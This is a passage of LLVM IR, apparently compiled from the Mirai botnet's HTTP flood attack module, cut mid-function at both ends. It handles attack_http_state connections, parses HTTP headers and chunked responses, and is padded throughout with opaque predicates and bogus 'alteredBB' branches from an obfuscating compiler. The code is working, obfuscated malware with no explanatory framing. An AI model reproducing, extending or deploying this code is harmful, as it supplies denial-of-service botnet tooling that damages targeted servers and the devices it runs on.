  %3515 = load i32, i32* %3514, align 4
  %3516 = icmp ne i32 %3515, 11
  %3517 = load i32, i32* @x.17
  %3518 = load i32, i32* @y.18
  %3519 = sub i32 %3517, 1
  %3520 = mul i32 %3517, %3519
  %3521 = urem i32 %3520, 2
  %3522 = icmp eq i32 %3521, 0
  %3523 = icmp slt i32 %3518, 10
  %3524 = or i1 %3522, %3523
  br i1 %3524, label %originalBBpart2582, label %originalBB580alteredBB

originalBBpart2582:                               ; preds = %originalBB580
  br i1 %3516, label %3525, label %3534

; <label>:3525:                                   ; preds = %originalBBpart2582
  %3526 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3527 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3526, i32 0, i32 0
  %3528 = load i32, i32* %3527, align 4
  %3529 = call i32 @close(i32 %3528)
  %3530 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3531 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3530, i32 0, i32 0
  store i32 -1, i32* %3531, align 4
  %3532 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3533 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3532, i32 0, i32 1
  store i8 0, i8* %3533, align 4
  br label %3534

; <label>:3534:                                   ; preds = %3525, %originalBBpart2582, %3501
  %3535 = load i32, i32* @x.17
  %3536 = load i32, i32* @y.18
  %3537 = sub i32 %3535, 1
  %3538 = mul i32 %3535, %3537
  %3539 = urem i32 %3538, 2
  %3540 = icmp eq i32 %3539, 0
  %3541 = icmp slt i32 %3536, 10
  %3542 = or i1 %3540, %3541
  br i1 %3542, label %originalBB584, label %originalBB584alteredBB

originalBB584:                                    ; preds = %originalBB584alteredBB, %3534
  %3543 = load i32, i32* @x.17
  %3544 = load i32, i32* @y.18
  %3545 = sub i32 %3543, 1
  %3546 = mul i32 %3543, %3545
  %3547 = urem i32 %3546, 2
  %3548 = icmp eq i32 %3547, 0
  %3549 = icmp slt i32 %3544, 10
  %3550 = or i1 %3548, %3549
  br i1 %3550, label %originalBBpart2586, label %originalBB584alteredBB

originalBBpart2586:                               ; preds = %originalBB584
  br label %4033

; <label>:3551:                                   ; preds = %3498
  %3552 = load i32, i32* @x.17
  %3553 = load i32, i32* @y.18
  %3554 = sub i32 %3552, 1
  %3555 = mul i32 %3552, %3554
  %3556 = urem i32 %3555, 2
  %3557 = icmp eq i32 %3556, 0
  %3558 = icmp slt i32 %3553, 10
  %3559 = or i1 %3557, %3558
  br i1 %3559, label %originalBB588, label %originalBB588alteredBB

originalBB588:                                    ; preds = %originalBB588alteredBB, %3551
  %3560 = load i32, i32* %12, align 4
  %3561 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3562 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3561, i32 0, i32 17
  %3563 = load i32, i32* %3562, align 4
  %3564 = add nsw i32 %3563, %3560
  store i32 %3564, i32* %3562, align 4
  %3565 = load i32, i32* %27, align 4
  %3566 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3567 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3566, i32 0, i32 2
  store i32 %3565, i32* %3567, align 4
  %3568 = load i32, i32* @x.17
  %3569 = load i32, i32* @y.18
  %3570 = sub i32 %3568, 1
  %3571 = mul i32 %3568, %3570
  %3572 = urem i32 %3571, 2
  %3573 = icmp eq i32 %3572, 0
  %3574 = icmp slt i32 %3569, 10
  %3575 = or i1 %3573, %3574
  br i1 %3575, label %originalBBpart2604, label %originalBB588alteredBB

originalBBpart2604:                               ; preds = %originalBB588
  br label %3576

; <label>:3576:                                   ; preds = %originalBBpart2645, %originalBBpart2604
  store i32 0, i32* %59, align 4
  %3577 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3578 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3577, i32 0, i32 14
  %3579 = load i32, i32* %3578, align 4
  %3580 = icmp sgt i32 %3579, 0
  br i1 %3580, label %3581, label %3784

; <label>:3581:                                   ; preds = %3576
  %3582 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3583 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3582, i32 0, i32 14
  %3584 = load i32, i32* %3583, align 4
  %3585 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3586 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3585, i32 0, i32 17
  %3587 = load i32, i32* %3586, align 4
  %3588 = icmp sgt i32 %3584, %3587
  br i1 %3588, label %3589, label %3593

; <label>:3589:                                   ; preds = %3581
  %3590 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3591 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3590, i32 0, i32 17
  %3592 = load i32, i32* %3591, align 4
  br label %3597

; <label>:3593:                                   ; preds = %3581
  %3594 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3595 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3594, i32 0, i32 14
  %3596 = load i32, i32* %3595, align 4
  br label %3597

; <label>:3597:                                   ; preds = %3593, %3589
  %3598 = phi i32 [ %3592, %3589 ], [ %3596, %3593 ]
  store i32 %3598, i32* %59, align 4
  %3599 = load i32, i32* %59, align 4
  %3600 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3601 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3600, i32 0, i32 14
  %3602 = load i32, i32* %3601, align 4
  %3603 = sub nsw i32 %3602, %3599
  store i32 %3603, i32* %3601, align 4
  %3604 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3605 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3604, i32 0, i32 11
  %3606 = load i32, i32* %3605, align 4
  %3607 = icmp eq i32 %3606, 1
  br i1 %3607, label %3608, label %3783

; <label>:3608:                                   ; preds = %3597
  %3609 = load i32, i32* @x.17
  %3610 = load i32, i32* @y.18
  %3611 = sub i32 %3609, 1
  %3612 = mul i32 %3609, %3611
  %3613 = urem i32 %3612, 2
  %3614 = icmp eq i32 %3613, 0
  %3615 = icmp slt i32 %3610, 10
  %3616 = or i1 %3614, %3615
  br i1 %3616, label %originalBB606, label %originalBB606alteredBB

originalBB606:                                    ; preds = %originalBB606alteredBB, %3608
  %3617 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3618 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3617, i32 0, i32 18
  %3619 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3618, i32 0, i32 0
  %3620 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3621 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3620, i32 0, i32 17
  %3622 = load i32, i32* %3621, align 4
  %3623 = call i8* @table_retrieve_val(i32 43, i32* null)
  %3624 = call i32 @util_memsearch(i8* %3619, i32 %3622, i8* %3623, i32 11)
  %3625 = icmp ne i32 %3624, -1
  %3626 = load i32, i32* @x.17
  %3627 = load i32, i32* @y.18
  %3628 = sub i32 %3626, 1
  %3629 = mul i32 %3626, %3628
  %3630 = urem i32 %3629, 2
  %3631 = icmp eq i32 %3630, 0
  %3632 = icmp slt i32 %3627, 10
  %3633 = or i1 %3631, %3632
  br i1 %3633, label %originalBBpart2608, label %originalBB606alteredBB

originalBBpart2608:                               ; preds = %originalBB606
  br i1 %3625, label %3634, label %3766

; <label>:3634:                                   ; preds = %originalBBpart2608
  %3635 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3636 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3635, i32 0, i32 18
  %3637 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3636, i32 0, i32 0
  %3638 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3639 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3638, i32 0, i32 17
  %3640 = load i32, i32* %3639, align 4
  %3641 = call i8* @table_retrieve_val(i32 43, i32* null)
  %3642 = call i32 @util_memsearch(i8* %3637, i32 %3640, i8* %3641, i32 11)
  store i32 %3642, i32* %60, align 4
  %3643 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3644 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3643, i32 0, i32 18
  %3645 = load i32, i32* %60, align 4
  %3646 = sext i32 %3645 to i64
  %3647 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3644, i64 0, i64 %3646
  %3648 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3649 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3648, i32 0, i32 17
  %3650 = load i32, i32* %3649, align 4
  %3651 = load i32, i32* %60, align 4
  %3652 = sub nsw i32 %3650, %3651
  %3653 = call i32 @util_memsearch(i8* %3647, i32 %3652, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %3653, i32* %61, align 4
  %3654 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3655 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3654, i32 0, i32 18
  %3656 = load i32, i32* %60, align 4
  %3657 = load i32, i32* %61, align 4
  %3658 = sub nsw i32 %3657, 1
  %3659 = add nsw i32 %3656, %3658
  %3660 = sext i32 %3659 to i64
  %3661 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3655, i64 0, i64 %3660
  store i8 0, i8* %3661, align 1
  %3662 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3663 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3662, i32 0, i32 15
  %3664 = load i32, i32* %3663, align 4
  %3665 = icmp slt i32 %3664, 5
  br i1 %3665, label %3666, label %3761

; <label>:3666:                                   ; preds = %3634
  %3667 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3668 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3667, i32 0, i32 18
  %3669 = load i32, i32* %60, align 4
  %3670 = sext i32 %3669 to i64
  %3671 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3668, i64 0, i64 %3670
  %3672 = call i32 @util_strlen(i8* %3671)
  %3673 = icmp slt i32 %3672, 128
  br i1 %3673, label %3674, label %3761

; <label>:3674:                                   ; preds = %3666
  %3675 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3676 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3675, i32 0, i32 16
  %3677 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3678 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3677, i32 0, i32 15
  %3679 = load i32, i32* %3678, align 4
  %3680 = sext i32 %3679 to i64
  %3681 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3676, i64 0, i64 %3680
  %3682 = getelementptr inbounds [128 x i8], [128 x i8]* %3681, i32 0, i32 0
  %3683 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3684 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3683, i32 0, i32 18
  %3685 = load i32, i32* %60, align 4
  %3686 = sext i32 %3685 to i64
  %3687 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3684, i64 0, i64 %3686
  %3688 = call i32 @util_strcpy(i8* %3682, i8* %3687)
  %3689 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3690 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3689, i32 0, i32 16
  %3691 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3692 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3691, i32 0, i32 15
  %3693 = load i32, i32* %3692, align 4
  %3694 = sext i32 %3693 to i64
  %3695 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3690, i64 0, i64 %3694
  %3696 = getelementptr inbounds [128 x i8], [128 x i8]* %3695, i32 0, i32 0
  %3697 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3698 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3697, i32 0, i32 16
  %3699 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3700 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3699, i32 0, i32 15
  %3701 = load i32, i32* %3700, align 4
  %3702 = sext i32 %3701 to i64
  %3703 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3698, i64 0, i64 %3702
  %3704 = getelementptr inbounds [128 x i8], [128 x i8]* %3703, i32 0, i32 0
  %3705 = call i32 @util_strlen(i8* %3704)
  %3706 = sext i32 %3705 to i64
  %3707 = getelementptr inbounds i8, i8* %3696, i64 %3706
  %3708 = call i32 @util_strcpy(i8* %3707, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0))
  %3709 = load i32, i32* %61, align 4
  %3710 = add nsw i32 %3709, 3
  %3711 = load i32, i32* %60, align 4
  %3712 = add nsw i32 %3711, %3710
  store i32 %3712, i32* %60, align 4
  %3713 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3714 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3713, i32 0, i32 18
  %3715 = load i32, i32* %60, align 4
  %3716 = sext i32 %3715 to i64
  %3717 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3714, i64 0, i64 %3716
  %3718 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3719 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3718, i32 0, i32 17
  %3720 = load i32, i32* %3719, align 4
  %3721 = load i32, i32* %60, align 4
  %3722 = sub nsw i32 %3720, %3721
  %3723 = call i32 @util_memsearch(i8* %3717, i32 %3722, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %3723, i32* %61, align 4
  %3724 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3725 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3724, i32 0, i32 18
  %3726 = load i32, i32* %60, align 4
  %3727 = load i32, i32* %61, align 4
  %3728 = sub nsw i32 %3727, 1
  %3729 = add nsw i32 %3726, %3728
  %3730 = sext i32 %3729 to i64
  %3731 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3725, i64 0, i64 %3730
  store i8 0, i8* %3731, align 1
  %3732 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3733 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3732, i32 0, i32 16
  %3734 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3735 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3734, i32 0, i32 15
  %3736 = load i32, i32* %3735, align 4
  %3737 = sext i32 %3736 to i64
  %3738 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3733, i64 0, i64 %3737
  %3739 = getelementptr inbounds [128 x i8], [128 x i8]* %3738, i32 0, i32 0
  %3740 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3741 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3740, i32 0, i32 16
  %3742 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3743 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3742, i32 0, i32 15
  %3744 = load i32, i32* %3743, align 4
  %3745 = sext i32 %3744 to i64
  %3746 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3741, i64 0, i64 %3745
  %3747 = getelementptr inbounds [128 x i8], [128 x i8]* %3746, i32 0, i32 0
  %3748 = call i32 @util_strlen(i8* %3747)
  %3749 = sext i32 %3748 to i64
  %3750 = getelementptr inbounds i8, i8* %3739, i64 %3749
  %3751 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3752 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3751, i32 0, i32 18
  %3753 = load i32, i32* %60, align 4
  %3754 = sext i32 %3753 to i64
  %3755 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3752, i64 0, i64 %3754
  %3756 = call i32 @util_strcpy(i8* %3750, i8* %3755)
  %3757 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3758 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3757, i32 0, i32 15
  %3759 = load i32, i32* %3758, align 4
  %3760 = add nsw i32 %3759, 1
  store i32 %3760, i32* %3758, align 4
  br label %3761

; <label>:3761:                                   ; preds = %3674, %3666, %3634
  %3762 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3763 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3762, i32 0, i32 14
  store i32 -1, i32* %3763, align 4
  %3764 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3765 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3764, i32 0, i32 1
  store i8 10, i8* %3765, align 4
  br label %4032

; <label>:3766:                                   ; preds = %originalBBpart2608
  %3767 = load i32, i32* @x.17
  %3768 = load i32, i32* @y.18
  %3769 = sub i32 %3767, 1
  %3770 = mul i32 %3767, %3769
  %3771 = urem i32 %3770, 2
  %3772 = icmp eq i32 %3771, 0
  %3773 = icmp slt i32 %3768, 10
  %3774 = or i1 %3772, %3773
  br i1 %3774, label %originalBB610, label %originalBB610alteredBB

originalBB610:                                    ; preds = %originalBB610alteredBB, %3766
  %3775 = load i32, i32* @x.17
  %3776 = load i32, i32* @y.18
  %3777 = sub i32 %3775, 1
  %3778 = mul i32 %3775, %3777
  %3779 = urem i32 %3778, 2
  %3780 = icmp eq i32 %3779, 0
  %3781 = icmp slt i32 %3776, 10
  %3782 = or i1 %3780, %3781
  br i1 %3782, label %originalBBpart2612, label %originalBB610alteredBB

originalBBpart2612:                               ; preds = %originalBB610
  br label %3783

; <label>:3783:                                   ; preds = %originalBBpart2612, %3597
  br label %3784

; <label>:3784:                                   ; preds = %3783, %3576
  %3785 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3786 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3785, i32 0, i32 14
  %3787 = load i32, i32* %3786, align 4
  %3788 = icmp eq i32 %3787, 0
  br i1 %3788, label %3789, label %3931

; <label>:3789:                                   ; preds = %3784
  %3790 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3791 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3790, i32 0, i32 13
  %3792 = load i32, i32* %3791, align 4
  %3793 = icmp eq i32 %3792, 1
  br i1 %3793, label %3794, label %3882

; <label>:3794:                                   ; preds = %3789
  %3795 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3796 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3795, i32 0, i32 18
  %3797 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3796, i32 0, i32 0
  %3798 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3799 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3798, i32 0, i32 17
  %3800 = load i32, i32* %3799, align 4
  %3801 = call i32 @util_memsearch(i8* %3797, i32 %3800, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  %3802 = icmp ne i32 %3801, -1
  br i1 %3802, label %3803, label %3881

; <label>:3803:                                   ; preds = %3794
  %3804 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3805 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3804, i32 0, i32 18
  %3806 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3805, i32 0, i32 0
  %3807 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3808 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3807, i32 0, i32 17
  %3809 = load i32, i32* %3808, align 4
  %3810 = call i32 @util_memsearch(i8* %3806, i32 %3809, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %3810, i32* %62, align 4
  %3811 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3812 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3811, i32 0, i32 18
  %3813 = load i32, i32* %62, align 4
  %3814 = sub nsw i32 %3813, 2
  %3815 = sext i32 %3814 to i64
  %3816 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3812, i64 0, i64 %3815
  store i8 0, i8* %3816, align 1
  %3817 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3818 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3817, i32 0, i32 18
  %3819 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3818, i32 0, i32 0
  %3820 = load i32, i32* %62, align 4
  %3821 = call i32 @util_memsearch(i8* %3819, i32 %3820, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %3822 = icmp ne i32 %3821, -1
  br i1 %3822, label %3823, label %3833

; <label>:3823:                                   ; preds = %3803
  %3824 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3825 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3824, i32 0, i32 18
  %3826 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3827 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3826, i32 0, i32 18
  %3828 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3827, i32 0, i32 0
  %3829 = load i32, i32* %62, align 4
  %3830 = call i32 @util_memsearch(i8* %3828, i32 %3829, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %3831 = sext i32 %3830 to i64
  %3832 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3825, i64 0, i64 %3831
  store i8 0, i8* %3832, align 1
  br label %3833

; <label>:3833:                                   ; preds = %3823, %3803
  %3834 = load i32, i32* @x.17
  %3835 = load i32, i32* @y.18
  %3836 = sub i32 %3834, 1
  %3837 = mul i32 %3834, %3836
  %3838 = urem i32 %3837, 2
  %3839 = icmp eq i32 %3838, 0
  %3840 = icmp slt i32 %3835, 10
  %3841 = or i1 %3839, %3840
  br i1 %3841, label %originalBB614, label %originalBB614alteredBB

originalBB614:                                    ; preds = %originalBB614alteredBB, %3833
  %3842 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3843 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3842, i32 0, i32 18
  %3844 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3843, i32 0, i32 0
  %3845 = call i32 @util_atoi(i8* %3844, i32 16)
  store i32 %3845, i32* %63, align 4
  %3846 = load i32, i32* %63, align 4
  %3847 = icmp eq i32 %3846, 0
  %3848 = load i32, i32* @x.17
  %3849 = load i32, i32* @y.18
  %3850 = sub i32 %3848, 1
  %3851 = mul i32 %3848, %3850
  %3852 = urem i32 %3851, 2
  %3853 = icmp eq i32 %3852, 0
  %3854 = icmp slt i32 %3849, 10
  %3855 = or i1 %3853, %3854
  br i1 %3855, label %originalBBpart2616, label %originalBB614alteredBB

originalBBpart2616:                               ; preds = %originalBB614
  br i1 %3847, label %3856, label %3875

; <label>:3856:                                   ; preds = %originalBBpart2616
  %3857 = load i32, i32* @x.17
  %3858 = load i32, i32* @y.18
  %3859 = sub i32 %3857, 1
  %3860 = mul i32 %3857, %3859
  %3861 = urem i32 %3860, 2
  %3862 = icmp eq i32 %3861, 0
  %3863 = icmp slt i32 %3858, 10
  %3864 = or i1 %3862, %3863
  br i1 %3864, label %originalBB618, label %originalBB618alteredBB

originalBB618:                                    ; preds = %originalBB618alteredBB, %3856
  %3865 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3866 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3865, i32 0, i32 1
  store i8 1, i8* %3866, align 4
  %3867 = load i32, i32* @x.17
  %3868 = load i32, i32* @y.18
  %3869 = sub i32 %3867, 1
  %3870 = mul i32 %3867, %3869
  %3871 = urem i32 %3870, 2
  %3872 = icmp eq i32 %3871, 0
  %3873 = icmp slt i32 %3868, 10
  %3874 = or i1 %3872, %3873
  br i1 %3874, label %originalBBpart2620, label %originalBB618alteredBB

originalBBpart2620:                               ; preds = %originalBB618
  br label %4032

; <label>:3875:                                   ; preds = %originalBBpart2616
  %3876 = load i32, i32* %63, align 4
  %3877 = add nsw i32 %3876, 2
  %3878 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3879 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3878, i32 0, i32 14
  store i32 %3877, i32* %3879, align 4
  %3880 = load i32, i32* %62, align 4
  store i32 %3880, i32* %59, align 4
  br label %3881

; <label>:3881:                                   ; preds = %3875, %3794
  br label %3930

; <label>:3882:                                   ; preds = %3789
  %3883 = load i32, i32* @x.17
  %3884 = load i32, i32* @y.18
  %3885 = sub i32 %3883, 1
  %3886 = mul i32 %3883, %3885
  %3887 = urem i32 %3886, 2
  %3888 = icmp eq i32 %3887, 0
  %3889 = icmp slt i32 %3884, 10
  %3890 = or i1 %3888, %3889
  br i1 %3890, label %originalBB622, label %originalBB622alteredBB

originalBB622:                                    ; preds = %originalBB622alteredBB, %3882
  %3891 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3892 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3891, i32 0, i32 17
  %3893 = load i32, i32* %3892, align 4
  %3894 = load i32, i32* %59, align 4
  %3895 = sub nsw i32 %3893, %3894
  %3896 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3897 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3896, i32 0, i32 14
  store i32 %3895, i32* %3897, align 4
  %3898 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3899 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3898, i32 0, i32 14
  %3900 = load i32, i32* %3899, align 4
  %3901 = icmp eq i32 %3900, 0
  %3902 = load i32, i32* @x.17
  %3903 = load i32, i32* @y.18
  %3904 = sub i32 %3902, 1
  %3905 = mul i32 %3902, %3904
  %3906 = urem i32 %3905, 2
  %3907 = icmp eq i32 %3906, 0
  %3908 = icmp slt i32 %3903, 10
  %3909 = or i1 %3907, %3908
  br i1 %3909, label %originalBBpart2625, label %originalBB622alteredBB

originalBBpart2625:                               ; preds = %originalBB622
  br i1 %3901, label %3910, label %3929

; <label>:3910:                                   ; preds = %originalBBpart2625
  %3911 = load i32, i32* @x.17
  %3912 = load i32, i32* @y.18
  %3913 = sub i32 %3911, 1
  %3914 = mul i32 %3911, %3913
  %3915 = urem i32 %3914, 2
  %3916 = icmp eq i32 %3915, 0
  %3917 = icmp slt i32 %3912, 10
  %3918 = or i1 %3916, %3917
  br i1 %3918, label %originalBB627, label %originalBB627alteredBB

originalBB627:                                    ; preds = %originalBB627alteredBB, %3910
  %3919 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3920 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3919, i32 0, i32 1
  store i8 1, i8* %3920, align 4
  %3921 = load i32, i32* @x.17
  %3922 = load i32, i32* @y.18
  %3923 = sub i32 %3921, 1
  %3924 = mul i32 %3921, %3923
  %3925 = urem i32 %3924, 2
  %3926 = icmp eq i32 %3925, 0
  %3927 = icmp slt i32 %3922, 10
  %3928 = or i1 %3926, %3927
  br i1 %3928, label %originalBBpart2629, label %originalBB627alteredBB

originalBBpart2629:                               ; preds = %originalBB627
  br label %4032

; <label>:3929:                                   ; preds = %originalBBpart2625
  br label %3930

; <label>:3930:                                   ; preds = %3929, %3881
  br label %3931

; <label>:3931:                                   ; preds = %3930, %3784
  %3932 = load i32, i32* @x.17
  %3933 = load i32, i32* @y.18
  %3934 = sub i32 %3932, 1
  %3935 = mul i32 %3932, %3934
  %3936 = urem i32 %3935, 2
  %3937 = icmp eq i32 %3936, 0
  %3938 = icmp slt i32 %3933, 10
  %3939 = or i1 %3937, %3938
  br i1 %3939, label %originalBB631, label %originalBB631alteredBB

originalBB631:                                    ; preds = %originalBB631alteredBB, %3931
  %3940 = load i32, i32* %59, align 4
  %3941 = icmp eq i32 %3940, 0
  %3942 = load i32, i32* @x.17
  %3943 = load i32, i32* @y.18
  %3944 = sub i32 %3942, 1
  %3945 = mul i32 %3942, %3944
  %3946 = urem i32 %3945, 2
  %3947 = icmp eq i32 %3946, 0
  %3948 = icmp slt i32 %3943, 10
  %3949 = or i1 %3947, %3948
  br i1 %3949, label %originalBBpart2633, label %originalBB631alteredBB

originalBBpart2633:                               ; preds = %originalBB631
  br i1 %3941, label %3950, label %3967

; <label>:3950:                                   ; preds = %originalBBpart2633
  %3951 = load i32, i32* @x.17
  %3952 = load i32, i32* @y.18
  %3953 = sub i32 %3951, 1
  %3954 = mul i32 %3951, %3953
  %3955 = urem i32 %3954, 2
  %3956 = icmp eq i32 %3955, 0
  %3957 = icmp slt i32 %3952, 10
  %3958 = or i1 %3956, %3957
  br i1 %3958, label %originalBB635, label %originalBB635alteredBB

originalBB635:                                    ; preds = %originalBB635alteredBB, %3950
  %3959 = load i32, i32* @x.17
  %3960 = load i32, i32* @y.18
  %3961 = sub i32 %3959, 1
  %3962 = mul i32 %3959, %3961
  %3963 = urem i32 %3962, 2
  %3964 = icmp eq i32 %3963, 0
